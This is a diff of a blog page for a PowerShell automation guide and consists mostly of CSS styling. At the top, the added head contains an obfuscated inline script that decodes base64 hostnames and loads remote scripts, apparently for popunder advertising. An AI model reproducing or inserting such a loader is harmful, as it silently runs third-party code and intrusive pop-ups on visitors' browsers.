@@ -1,823 +1,1530 @@
-<!-- ===== POWERSHELL BOOK POST - CYBERSUME FULL SCREEN BLACK EDITION ===== -->
-<!-- Isko Blogger Post Editor mein HTML mode mein paste karein -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var v=window,q="e25514fe4b35f595db6750aa70f72f50",h=[["siteId",322*819*448+424-112824949],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],o=["d3d3LmludGVsbGlwb3B1cC5jb20vamRhcmttb2RlLWpzLm1pbi5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvWC9yZmpzb24ubWluLmpz"],e=-1,d,s,k=function(){clearTimeout(s);e++;if(o[e]&&!(1816360970000<(new Date).getTime()&&1<e)){d=v.document.createElement("script");d.type="text/javascript";d.async=!0;var a=v.document.getElementsByTagName("script")[0];d.src="https://"+atob(o[e]);d.crossOrigin="anonymous";d.onerror=k;d.onload=function(){clearTimeout(s);v[q.slice(0,16)+q.slice(0,16)]||k()};s=setTimeout(k,5E3);a.parentNode.insertBefore(d,a)}};if(!v[q]){try{Object.freeze(v[q]=h)}catch(e){}k()}})();
+/*]]>/* */
+</script>
 
-<style>
-    /* ===== FULL SCREEN WRAPPER ===== */
-    .cyber-post-wrapper {
-        width: 100% !important;
-        max-width: 100% !important;
-        margin: 0 !important;
-        padding: 30px 40px 50px !important;
-        background: #000000 !important;
-        color: #ffffff;
-        border-radius: 0 !important;
-        box-sizing: border-box;
-    }
-    
-    /* ===== RESPONSIVE FULL SCREEN MARGINS ===== */
-    @media (max-width: 1200px) {
-        .cyber-post-wrapper {
-            padding: 25px 35px 45px !important;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell Automation — Complete Guide</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper {
-            padding: 22px 30px 40px !important;
+
+        html {
+            scroll-behavior: smooth;
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper {
-            padding: 18px 22px 35px !important;
+
+        body {
+            font-family: 'Outfit', -apple-system, sans-serif;
+            background: #000000;
+            background-image: 
+                radial-gradient(ellipse 80% 60% at 50% -20%, rgba(0, 255, 136, 0.08), transparent),
+                radial-gradient(ellipse 60% 50% at 100% 100%, rgba(0, 217, 255, 0.05), transparent);
+            background-attachment: fixed;
+            color: #ffffff;
+            min-height: 100vh;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            padding: 0;
         }
-    }
-    
-    @media (max-width: 600px) {
-        .cyber-post-wrapper {
-            padding: 15px 18px 30px !important;
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 48px 32px 100px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper {
-            padding: 12px 14px 25px !important;
-        }
-    }
-    
-    /* ===== CONTENT MAX WIDTH ===== */
-    .cyber-content {
-        max-width: 1100px;
-        margin: 0 auto;
-        padding: 0;
-    }
-    
-    /* ===== POST HEADER ===== */
-    .post-header-cyber {
-        margin-bottom: 35px;
-        padding-bottom: 25px;
-        border-bottom: 1px solid rgba(0, 255, 136, 0.08);
-        background: transparent;
-    }
-    
-    .post-badge {
-        display: inline-block;
-        padding: 6px 26px;
-        background: rgba(0, 255, 136, 0.08);
-        border: 1px solid #00ff88;
-        border-radius: 50px;
-        color: #00ff88;
-        font-size: 13px;
-        text-transform: uppercase;
-        letter-spacing: 3px;
-        margin-bottom: 20px;
-    }
-    
-    .post-title-cyber {
-        font-size: 40px;
-        font-weight: 900;
-        line-height: 1.15;
-        color: #ffffff !important;
-        margin: 12px 0 18px;
-        letter-spacing: -0.5px;
-    }
-    
-    .post-title-cyber strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 992px) {
-        .post-title-cyber {
-            font-size: 32px;
-        }
-    }
-    
-    @media (max-width: 768px) {
-        .post-title-cyber {
-            font-size: 26px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .post-title-cyber {
-            font-size: 22px;
-        }
-    }
-    
-    /* ===== FEATURED BOX ===== */
-    .featured-box {
-        display: flex;
-        flex-wrap: wrap;
-        align-items: center;
-        gap: 35px;
-        background: #0a0a0a !important;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 18px;
-        padding: 32px 38px;
-        margin: 25px 0 38px;
-        justify-content: center;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-box {
-            flex-direction: column;
+
+        /* ===== HEADER ===== */
+        .page-header {
             text-align: center;
-            padding: 25px 22px;
-            gap: 22px;
+            padding: 20px 0 48px;
+            position: relative;
+            margin-bottom: 48px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-box {
-            padding: 20px 16px;
+
+        .page-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 140px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
         }
-    }
-    
-    .featured-image {
-        flex-shrink: 0;
-    }
-    
-    .featured-image img {
-        max-width: 220px;
-        height: auto;
-        border-radius: 14px;
-        border: 2px solid #00ff88;
-        transition: 0.3s;
-        background: #000000;
-    }
-    
-    .featured-image img:first-child {
-        max-width: 200px;
-    }
-    
-    .featured-image .download-btn-img {
-        max-width: 280px !important;
-        margin-top: 10px;
-        border: none !important;
-        border-radius: 10px !important;
-        transition: 0.3s;
-    }
-    
-    .featured-image .download-btn-img:hover {
-        transform: scale(1.03);
-        box-shadow: 0 0 30px rgba(0, 255, 136, 0.15);
-    }
-    
-    @media (max-width: 768px) {
-        .featured-image img {
-            max-width: 180px;
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 100px;
+            color: #00ff88;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+            backdrop-filter: blur(10px);
         }
-        .featured-image .download-btn-img {
-            max-width: 240px !important;
+
+        .badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff88;
+            animation: pulse 2s infinite;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-image img {
-            max-width: 150px;
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
         }
-        .featured-image .download-btn-img {
-            max-width: 200px !important;
+
+        h1 {
+            font-size: clamp(34px, 5.5vw, 62px);
+            font-weight: 900;
+            line-height: 1.08;
+            letter-spacing: -0.03em;
+            margin-bottom: 18px;
+            background: linear-gradient(180deg, #ffffff 0%, #8892a8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-    }
-    
-    .featured-image img:hover {
-        transform: scale(1.03);
-        box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);
-    }
-    
-    .featured-cta {
-        flex: 1;
-        text-align: center;
-    }
-    
-    .featured-cta p {
-        color: #b0b8c8 !important;
-        margin: 5px 0 12px !important;
-        font-size: 16px;
-    }
-    
-    .featured-cta .main-link {
-        display: inline-block;
-        padding: 15px 42px;
-        background: linear-gradient(135deg, #00ff88, #00cc77);
-        color: #000000 !important;
-        border-radius: 10px;
-        font-weight: 700;
-        font-size: 16px;
-        text-decoration: none;
-        margin-top: 6px;
-        transition: all 0.3s ease;
-        letter-spacing: 0.5px;
-    }
-    
-    .featured-cta .main-link:hover {
-        transform: scale(1.04);
-        box-shadow: 0 0 35px rgba(0, 255, 136, 0.25);
-    }
-    
-    .featured-cta .small-note {
-        color: #6a7290 !important;
-        font-size: 13px;
-        margin-top: 12px !important;
-    }
-    
-    .image-group {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 10px;
-    }
-    
-    /* ===== HEADINGS ===== */
-    .cyber-post-wrapper h2 {
-        color: #ffffff !important;
-        font-size: 28px;
-        font-weight: 800;
-        margin-top: 40px;
-        margin-bottom: 18px;
-        border-left: 5px solid #00ff88;
-        padding-left: 20px;
-        line-height: 1.3;
-    }
-    
-    .cyber-post-wrapper h2#why {
-        border-left-color: #00d9ff;
-    }
-    
-    .cyber-post-wrapper h2#learn {
-        border-left-color: #ffcc00;
-    }
-    
-    .cyber-post-wrapper h2#designed {
-        border-left-color: #ff6b6b;
-    }
-    
-    .cyber-post-wrapper h2#projects {
-        border-left-color: #00ff88;
-    }
-    
-    .cyber-post-wrapper h2#readers {
-        border-left-color: #00d9ff;
-    }
-    
-    .cyber-post-wrapper h2#start {
-        border-left-color: #ffcc00;
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper h2 {
-            font-size: 26px;
+
+        h1 .highlight {
+            background: linear-gradient(135deg, #00ff88 0%, #00d9ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper h2 {
-            font-size: 24px;
-            padding-left: 16px;
-            margin-top: 35px;
+
+        .subtitle {
+            color: #8892a8;
+            font-size: 17px;
+            font-weight: 300;
+            max-width: 660px;
+            margin: 0 auto 24px;
+        }
+
+        .meta-bar {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 24px 0 0;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            background: rgba(10, 15, 25, 0.6);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 100px;
+            color: #8892a8;
+            font-size: 12.5px;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+        }
+
+        .meta-item .ico {
+            font-size: 14px;
+        }
+
+        .meta-item strong {
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+        }
+
+        /* ===== TABLE OF CONTENTS ===== */
+        .toc {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 20px;
+            padding: 26px 28px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .toc::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.6;
+        }
+
+        .toc-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper h2 {
-            font-size: 20px;
-            padding-left: 14px;
-            margin-top: 28px;
+
+        .toc-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 8px;
+            list-style: none;
+        }
+
+        .toc-list li a {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            color: #b0b8c8;
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 10px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .toc-list li a:hover {
+            background: rgba(0, 255, 136, 0.05);
+            border-color: rgba(0, 255, 136, 0.15);
+            color: #00ff88;
+            transform: translateX(4px);
+        }
+
+        .toc-list li a .num {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        /* ===== SECTIONS ===== */
+        .section {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.08);
+            border-radius: 20px;
+            padding: 36px 34px;
+            margin-bottom: 26px;
+            position: relative;
+            overflow: hidden;
+            transition: border-color 0.3s ease;
+            scroll-margin-top: 20px;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.5;
+        }
+
+        .section:hover {
+            border-color: rgba(0, 255, 136, 0.2);
+        }
+
+        .section-number {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 700;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            padding: 3px 10px;
+            border-radius: 6px;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 25px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+            line-height: 1.25;
+        }
+
+        .section-title .icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.12), rgba(0, 217, 255, 0.06));
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            flex-shrink: 0;
+        }
+
+        h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 24px 0 12px;
+            letter-spacing: -0.01em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        h3::before {
+            content: '▸';
+            color: #00d9ff;
+            font-size: 16px;
+        }
+
+        h4 {
+            font-size: 15.5px;
+            font-weight: 600;
+            color: #ffffff;
+            margin: 18px 0 8px;
+        }
+
+        p {
+            color: #b0b8c8;
+            font-size: 15.5px;
+            line-height: 1.75;
             margin-bottom: 14px;
         }
-    }
-    
-    /* ===== PARAGRAPHS ===== */
-    .cyber-post-wrapper p {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 1.95;
-        margin: 16px 0 20px;
-    }
-    
-    .cyber-post-wrapper p strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper p {
-            font-size: 16px;
-            line-height: 1.85;
+
+        p:last-child {
+            margin-bottom: 0;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper p {
+
+        strong {
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        em {
+            color: #00d9ff;
+            font-style: normal;
+            font-weight: 500;
+        }
+
+        a {
+            color: #00ff88;
+            text-decoration: none;
+            border-bottom: 1px dotted rgba(0, 255, 136, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        a:hover {
+            color: #00d9ff;
+            border-bottom-color: #00d9ff;
+        }
+
+        /* ===== LISTS ===== */
+        ul, ol {
+            list-style: none;
+            margin: 12px 0;
+        }
+
+        ul li {
+            color: #b0b8c8;
             font-size: 15px;
+            padding: 10px 0 10px 32px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        ul li:last-child {
+            border-bottom: none;
+        }
+
+        ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 8px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        ol {
+            counter-reset: item;
+        }
+
+        ol li {
+            color: #b0b8c8;
+            font-size: 15px;
+            padding: 10px 0 10px 42px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            counter-increment: item;
+        }
+
+        ol li:last-child {
+            border-bottom: none;
+        }
+
+        ol li::before {
+            content: counter(item);
+            position: absolute;
+            left: 0;
+            top: 10px;
+            width: 26px;
+            height: 26px;
+            border-radius: 8px;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== INLINE CODE ===== */
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 7px;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            font-weight: 500;
+        }
+
+        /* ===== CODE BLOCKS ===== */
+        .code-block {
+            background: #04060a;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 18px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.75;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 10px;
+            right: 16px;
+            font-size: 10px;
+            color: #00ff88;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 700;
+            opacity: 0.5;
+        }
+
+        .code-block code {
+            color: #d4d4d4;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: pre;
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 13px;
+        }
+
+        .cmt { color: #5a6478; font-style: italic; }
+        .cmd { color: #00ff88; font-weight: 500; }
+        .var { color: #00d9ff; }
+        .str { color: #ffd166; }
+        .kw  { color: #ff79c6; font-weight: 600; }
+        .num { color: #bd93f9; }
+        .fn  { color: #50fa7b; }
+        .cls { color: #ffb86c; font-weight: 600; }
+
+        /* ===== CALLOUT ===== */
+        .callout {
+            background: rgba(0, 255, 136, 0.04);
+            border-left: 3px solid #00ff88;
+            border-radius: 0 12px 12px 0;
+            padding: 18px 22px;
+            margin: 20px 0;
+            color: #c8d0e0;
+            font-size: 14.5px;
+            line-height: 1.7;
+        }
+
+        .callout strong {
+            color: #00ff88;
+        }
+
+        .callout.warn {
+            background: rgba(255, 107, 107, 0.04);
+            border-left-color: #ff6b6b;
+        }
+
+        .callout.warn strong {
+            color: #ff6b6b;
+        }
+
+        .callout.info {
+            background: rgba(0, 217, 255, 0.04);
+            border-left-color: #00d9ff;
+        }
+
+        .callout.info strong {
+            color: #00d9ff;
+        }
+
+        /* ===== TABLE ===== */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 18px 0;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+            min-width: 520px;
+        }
+
+        thead {
+            background: rgba(0, 255, 136, 0.06);
+        }
+
+        th {
+            text-align: left;
+            padding: 14px 18px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 12px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.15);
+        }
+
+        td {
+            padding: 13px 18px;
+            color: #b0b8c8;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            line-height: 1.6;
+        }
+
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr:hover {
+            background: rgba(0, 255, 136, 0.02);
+        }
+
+        td code {
+            font-size: 12px;
+        }
+
+        /* ===== TOOL CARDS GRID ===== */
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 14px;
+            margin: 20px 0 4px;
+        }
+
+        .tool-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 14px;
+            padding: 18px 18px 16px;
+            transition: all 0.25s ease;
+        }
+
+        .tool-card:hover {
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .tool-card .tool-name {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tool-card .tool-name .ico {
+            font-size: 16px;
+        }
+
+        .tool-card p {
+            font-size: 13px;
+            color: #8892a8;
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        /* ===== USE CASES GRID ===== */
+        .use-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 14px;
+            margin: 20px 0 4px;
+        }
+
+        .use-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 14px;
+            padding: 20px 18px;
+            transition: all 0.25s ease;
+        }
+
+        .use-card:hover {
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .use-card .use-icon {
+            font-size: 26px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .use-card h4 {
+            font-size: 14.5px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 0 0 8px;
+        }
+
+        .use-card p {
+            font-size: 13px;
+            color: #8892a8;
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        /* ===== FOOTER ===== */
+        .page-footer {
+            text-align: center;
+            padding: 48px 0 0;
+            margin-top: 40px;
+            border-top: 1px solid rgba(0, 255, 136, 0.08);
+            color: #4a5568;
+            font-size: 13px;
             line-height: 1.8;
-            margin: 14px 0 16px;
         }
-    }
-    
-    /* ===== LISTS ===== */
-    .cyber-post-wrapper ul,
-    .cyber-post-wrapper ol {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 2.3;
-        padding-left: 0;
-        margin: 14px 0 22px;
-        list-style: none;
-    }
-    
-    .cyber-post-wrapper ul li,
-    .cyber-post-wrapper ol li {
-        color: #b0b8c8 !important;
-        margin-bottom: 4px;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .cyber-post-wrapper ul li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    .cyber-post-wrapper ol {
-        list-style: none;
-        counter-reset: item;
-    }
-    
-    .cyber-post-wrapper ol li {
-        counter-increment: item;
-        padding-left: 35px;
-    }
-    
-    .cyber-post-wrapper ol li::before {
-        content: counter(item) ".";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-        font-size: 16px;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper ul,
-        .cyber-post-wrapper ol {
-            font-size: 15px;
-            line-height: 2.1;
-        }
-        .cyber-post-wrapper ul li,
-        .cyber-post-wrapper ol li {
-            padding-left: 24px;
-        }
-        .cyber-post-wrapper ol li {
-            padding-left: 30px;
-        }
-    }
-    
-    /* ===== TWO COLUMN LIST ===== */
-    .two-col-list {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 4px 40px;
-        padding-left: 0 !important;
-        list-style: none !important;
-        margin: 14px 0 22px;
-    }
-    
-    .two-col-list li {
-        color: #b0b8c8 !important;
-        font-size: 16.5px;
-        line-height: 2.2;
-        padding: 4px 0;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .two-col-list li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-    }
-    
-    @media (max-width: 768px) {
-        .two-col-list {
-            grid-template-columns: 1fr 1fr;
-            gap: 2px 20px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-            padding-left: 24px;
-        }
-    }
-    
-    @media (max-width: 600px) {
-        .two-col-list {
-            grid-template-columns: 1fr;
-            gap: 2px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .two-col-list li {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== HORIZONTAL RULE ===== */
-    .cyber-post-wrapper hr {
-        border: none;
-        border-top: 1px solid rgba(0, 255, 136, 0.06);
-        margin: 30px 0 32px;
-        background: transparent;
-        height: 1px;
-    }
-    
-    /* ===== SHARE SECTION ===== */
-    .share-section {
-        margin-top: 50px;
-        padding-top: 30px;
-        border-top: 1px solid rgba(0, 255, 136, 0.08);
-    }
-    
-    .share-section p {
-        color: #6a7290 !important;
-        font-size: 15px;
-        text-align: center;
-        margin-bottom: 16px !important;
-    }
-    
-    .share-buttons {
-        display: flex;
-        gap: 16px;
-        justify-content: center;
-        flex-wrap: wrap;
-    }
-    
-    .share-buttons a {
-        padding: 12px 28px;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 10px;
-        color: #b0b8c8 !important;
-        text-decoration: none;
-        font-size: 15px;
-        font-weight: 500;
-        transition: 0.3s;
-        background: transparent;
-    }
-    
-    .share-buttons a:hover {
-        border-color: #00ff88;
-        color: #00ff88 !important;
-        background: rgba(0, 255, 136, 0.04);
-        transform: translateY(-2px);
-    }
-    
-    @media (max-width: 480px) {
-        .share-buttons a {
-            padding: 10px 18px;
-            font-size: 13px;
-        }
-        .share-section {
-            margin-top: 35px;
-            padding-top: 22px;
-        }
-    }
-    
-    /* ===== BOOK HIGHLIGHT BOX ===== */
-    .book-highlight {
-        background: linear-gradient(135deg, rgba(0, 255, 136, 0.05), rgba(0, 217, 255, 0.05));
-        border: 1px solid rgba(0, 255, 136, 0.1);
-        border-radius: 14px;
-        padding: 24px 30px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .book-highlight p {
-        margin: 5px 0 !important;
-        font-size: 16px;
-    }
-    
-    .book-highlight .highlight-title {
-        color: #00ff88;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .book-highlight {
-            padding: 18px 16px;
-        }
-        .book-highlight p {
-            font-size: 14px;
-        }
-        .book-highlight .highlight-title {
-            font-size: 16px;
-        }
-    }
-    
-    /* ===== AUTHOR BOX ===== */
-    .author-box {
-        background: rgba(0, 255, 136, 0.03);
-        border: 1px solid rgba(0, 255, 136, 0.08);
-        border-radius: 14px;
-        padding: 20px 28px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .author-box .author-name {
-        color: #00ff88;
-        font-weight: 700;
-        font-size: 20px;
-    }
-    
-    .author-box p {
-        margin: 5px 0 !important;
-        font-size: 15px;
-    }
-    
-    @media (max-width: 480px) {
-        .author-box {
-            padding: 16px 16px;
-        }
-        .author-box .author-name {
-            font-size: 17px;
-        }
-        .author-box p {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== BLOGGER OVERRIDES ===== */
-    .blog-posts {
-        max-width: 100% !important;
-        padding: 0 !important;
-    }
-    
-    .post-body {
-        padding: 0 !important;
-        background: #000000 !important;
-    }
-    
-    .post-body-content {
-        background: #000000 !important;
-        padding: 0 !important;
-    }
-    
-    .post-outer {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    .post {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    /* ===== INLINE CODE ===== */
-    .cyber-post-wrapper code {
-        background: #0a0a0a;
-        padding: 2px 12px;
-        border-radius: 4px;
-        color: #00ff88;
-        border: 1px solid rgba(0, 255, 136, 0.08);
-        font-size: 14.5px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper code {
-            font-size: 13px;
-            padding: 1px 8px;
-        }
-    }
-    
-    /* ===== IMAGES ===== */
-    .cyber-post-wrapper img {
-        max-width: 100%;
-        height: auto;
-        border-radius: 12px;
-        margin: 10px 0;
-        border: 1px solid rgba(0, 255, 136, 0.05);
-    }
-    
-    .separator {
-        clear: both;
-        text-align: center;
-    }
-</style>
 
-<!-- ===== MAIN CONTENT ===== -->
-<div class="cyber-post-wrapper">
+        .page-footer .brand {
+            font-family: 'JetBrains Mono', monospace;
+            color: #00ff88;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
 
-    <div class="cyber-content">
+        .page-footer a {
+            border-bottom: none;
+        }
 
-        <!-- ===== POST HEADER ===== -->
-        <div class="post-header-cyber">
-            <div class="post-badge">⚡ Automation Guide</div>
-            <h1 class="post-title-cyber">Master Windows Automation with <strong>PowerShell: The Complete Guide from Beginner to Advanced</strong></h1>
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container { padding: 28px 18px 70px; }
+            .section { padding: 26px 22px; border-radius: 16px; }
+            .section-title { font-size: 20px; gap: 12px; }
+            .section-title .icon { width: 40px; height: 40px; font-size: 18px; }
+            h1 { font-size: 32px; }
+            .subtitle { font-size: 15px; }
+            .toc { padding: 20px 18px; }
+            .toc-list { grid-template-columns: 1fr; }
+            p { font-size: 14.5px; }
+            ul li { font-size: 14px; }
+            ol li { font-size: 14px; }
+            .code-block { font-size: 12px; padding: 16px 14px; }
+            .code-block code { font-size: 12px; }
+            h3 { font-size: 16px; }
+            .tool-grid { grid-template-columns: 1fr; }
+            .use-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 20px 12px 60px; }
+            h1 { font-size: 26px; }
+            .section { padding: 22px 16px; }
+            .section-title { font-size: 17px; }
+            .section-title .icon { width: 34px; height: 34px; font-size: 15px; }
+            .meta-bar { gap: 8px; }
+            .meta-item { font-size: 11px; padding: 6px 12px; }
+        }
+
